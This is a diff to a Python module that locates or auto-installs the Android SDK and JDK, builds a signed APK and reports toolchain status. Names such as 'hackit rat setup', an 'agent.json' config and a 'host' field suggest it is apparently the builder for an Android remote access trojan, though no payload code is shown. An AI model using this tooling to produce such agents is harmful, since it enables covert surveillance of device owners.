@@ -27,6 +27,9 @@ import time
 from dataclasses import dataclass
 from typing import Dict, List, Optional
 
+from . import sdk as sdk_tools
+from . import term
+
 TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "template")
 MIN_SDK = 21
 TARGET_SDK = 35
@@ -86,20 +89,25 @@ def _which(name: str, extra: List[str]) -> Optional[str]:
     return None
 
 
-def _sdk_root() -> str:
-    for key in ("ANDROID_HOME", "ANDROID_SDK_ROOT"):
-        value = os.environ.get(key)
-        if value and os.path.isdir(value):
-            return value
-    for guess in (
-        os.path.join(os.path.expanduser("~"), "Android", "Sdk"),
-        os.path.join(os.path.expanduser("~"), "android-sdk"),
-        "/opt/android-sdk",
-        "/usr/lib/android-sdk",
-    ):
-        if os.path.isdir(guess):
-            return guess
-    raise BuildError("Android SDK not found — set ANDROID_HOME to the sdk directory")
+SDK_HELP = (
+    "Android SDK not found — run `hackit rat setup` (auto-installs it), "
+    "or set ANDROID_HOME to an existing SDK"
+)
+
+
+def _sdk_root(bootstrap: bool = False) -> str:
+    found = sdk_tools.find()
+    if found:
+        os.environ.setdefault("ANDROID_HOME", found)
+        os.environ.setdefault("ANDROID_SDK_ROOT", found)
+        return found
+    if not bootstrap:
+        raise BuildError(SDK_HELP)
+    print(term._colored("  sdk         absent — bootstrapping the official toolchain", term.Dim))
+    try:
+        return sdk_tools.ensure(echo=lambda line: print(term._colored(line, term.Dim)))
+    except sdk_tools.SdkError as exc:
+        raise BuildError(f"{exc} — {SDK_HELP}") from exc
 
 
 def _latest(folder: str) -> Optional[str]:
@@ -117,12 +125,12 @@ def _latest(folder: str) -> Optional[str]:
     return os.path.join(folder, entries[-1][1])
 
 
-def discover(engine: str = "auto") -> Toolchain:
-    home = _sdk_root()
-    java = _which("java", [os.path.join(home, "jbr", "bin")])
-    javac = _which("javac", [os.path.join(home, "jbr", "bin")])
+def discover(engine: str = "auto", bootstrap: bool = False) -> Toolchain:
+    home = _sdk_root(bootstrap)
+    java = sdk_tools.java_bin("java")
+    javac = sdk_tools.java_bin("javac")
     if not java or not javac:
-        raise BuildError("JDK not found — JDK 17 is required (brew/apt install openjdk@17)")
+        raise BuildError("JDK not found — OpenJDK 17 is required (apt/brew install openjdk@17)")
     keytool = os.path.join(os.path.dirname(javac), "keytool")
     if not os.path.isfile(keytool):
         raise BuildError(f"keytool missing next to javac ({keytool})")
@@ -131,9 +139,12 @@ def discover(engine: str = "auto") -> Toolchain:
     build_tools = _latest(bt_root) or ""
     platform = _latest(os.path.join(home, "platforms"))
     if not platform or not os.path.isfile(os.path.join(platform, "android.jar")):
-        raise BuildError(f"no platform android.jar under {os.path.join(home, 'platforms')}")
+        raise BuildError(
+            f"no platform android.jar under {os.path.join(home, 'platforms')}"
+            f" — `sdkmanager \"{sdk_tools.PLATFORM_PACKAGE}\"`"
+        )
     if not build_tools and engine in ("sdk", "auto"):
-        raise BuildError(f"no build-tools under {bt_root} — `sdkmanager 'build-tools;35.0.0'`")
+        raise BuildError(f"no build-tools under {bt_root} — `sdkmanager '{sdk_tools.BUILD_TOOLS_PACKAGE}'`")
 
     def tool(name: str) -> str:
         found = _which(name, [build_tools])
@@ -442,13 +453,14 @@ def build(
     engine: str = "auto",
     release: bool = True,
     out: Optional[str] = None,
+    bootstrap: bool = True,
 ) -> str:
     """Run the build and return the APK path. Raises BuildError on any doubt."""
     if engine not in ("auto", "sdk", "gradle"):
         raise BuildError(f"unknown engine {engine!r}")
     if engine == "auto":
         engine = "gradle" if shutil.which("gradle") else "sdk"
-    tc = discover(engine)
+    tc = discover(engine, bootstrap=bootstrap)
     work = _stage(config)
     if engine == "gradle":
         produced = build_with_gradle(work, tc, release)
@@ -462,46 +474,75 @@ def build(
     size = os.path.getsize(target)
     if size < 10_000:
         raise BuildError(f"apk suspiciously small ({size} bytes) — build likely incomplete")
-    print(f"  engine      {engine}")
-    print(f"  work        {work}")
-    print(f"  apk         {target}  ({size:,} bytes)")
-    print(f"  config      {os.path.join(work, 'src', 'main', 'assets', 'agent.json')}")
+    width = 13
+    for key, value in (
+        ("engine", engine),
+        ("apk", f"{target}  ({size:,} bytes)"),
+        ("sha256", _digest(target)),
+        ("work", work),
+        ("config", os.path.join(work, "src", "main", "assets", "agent.json")),
+        ("spec", str(config.get("spec", "rat"))),
+        ("host", str(config.get("host", ""))),
+    ):
+        print(term.label(key, width) + term.Bright + str(value) + term.RESET)
     return target
 
 
-def doctor() -> int:
+def _digest(path: str) -> str:
+    digest = hashlib.sha256()
+    with open(path, "rb") as handle:
+        for block in iter(lambda: handle.read(1 << 20), b""):
+            digest.update(block)
+    return digest.hexdigest()
+
+
+def doctor(bootstrap: bool = False) -> int:
     """Report what the toolchain has and what is missing, without building."""
-    problems = 0
+    footer = ""
     try:
-        tc = discover("auto")
+        tc = discover("auto", bootstrap=bootstrap)
     except BuildError as exc:
-        print(f"  [x] {exc}")
+        print(term.Bad + "  [x] " + str(exc) + term.RESET)
+        if bootstrap:
+            return 1
+        print(term.Dim + "      run `hackit rat setup` to install it automatically" + term.RESET)
         return 1
-    checks = {
-        "ANDROID_HOME": tc.android_home,
-        "java": tc.java,
-        "javac": tc.javac,
-        "android.jar": tc.platform_jar,
-        "build-tools": tc.build_tools or "MISSING",
-        "aapt2": tc.aapt2 or "MISSING",
-        "d8": tc.d8 or "MISSING",
-        "zipalign": tc.zipalign or "MISSING",
-        "apksigner": tc.apksigner or "MISSING",
-        "ndk": tc.ndk or "MISSING (native engine disabled)",
-        "cmake": tc.cmake or "MISSING (native engine disabled)",
-        "gradle (optional)": tc.gradle or "absent — sdk engine will be used",
-    }
-    for name, value in checks.items():
-        state = "x" if value == "MISSING" else "ok"
-        if state == "x":
+    checks = (
+        ("ANDROID_HOME", tc.android_home, True),
+        ("java", tc.java, True),
+        ("javac", tc.javac, True),
+        ("android.jar", tc.platform_jar, True),
+        ("build-tools", tc.build_tools, True),
+        ("aapt2", tc.aapt2, True),
+        ("d8", tc.d8, True),
+        ("zipalign", tc.zipalign, True),
+        ("apksigner", tc.apksigner, True),
+        ("ndk", tc.ndk, False),
+        ("cmake", tc.cmake, False),
+        ("gradle", tc.gradle or "absent — sdk engine will be used", False),
+    )
+    problems = 0
+    for name, value, required in checks:
+        missing = not value or value == "MISSING"
+        if missing and required:
             problems += 1
-        print(f"  [{state}] {name}: {value}")
-    try:
-        version = subprocess.run([tc.java, "-version"], capture_output=True, text=True, timeout=20)
-        print(f"  [ok] java version: {(version.stderr or version.stdout).splitlines()[0]}")
-    except (subprocess.SubprocessError, OSError):
-        print("  [x] java does not run")
-        problems += 1
+        mark = term.Good + "ok" + term.RESET if not missing else (
+            term.Bad + "MISSING" + term.RESET if required else term.Warn + "optional" + term.RESET
+        )
+        print("  " + term.label(name, 14) + mark + "  " + term.Dim + str(value or "-") + term.RESET)
+    if tc.java:
+        try:
+            version = subprocess.run([tc.java, "-version"], capture_output=True, text=True, timeout=20)
+            first = (version.stderr or version.stdout).splitlines()
+            print("  " + term.label("java version", 14) + term.Dim
+                  + (first[0] if first else "?") + term.RESET)
+        except (subprocess.SubprocessError, OSError):
+            print("  " + term.label("java version", 14) + term.Bad + "java does not run" + term.RESET)
+            problems += 1
+    if problems == 0:
+        footer = "toolchain ready — `make app` will produce a signed APK"
+    if footer:
+        print("  " + term.Good + footer + term.RESET)
     return 0 if problems == 0 else 1
 
 
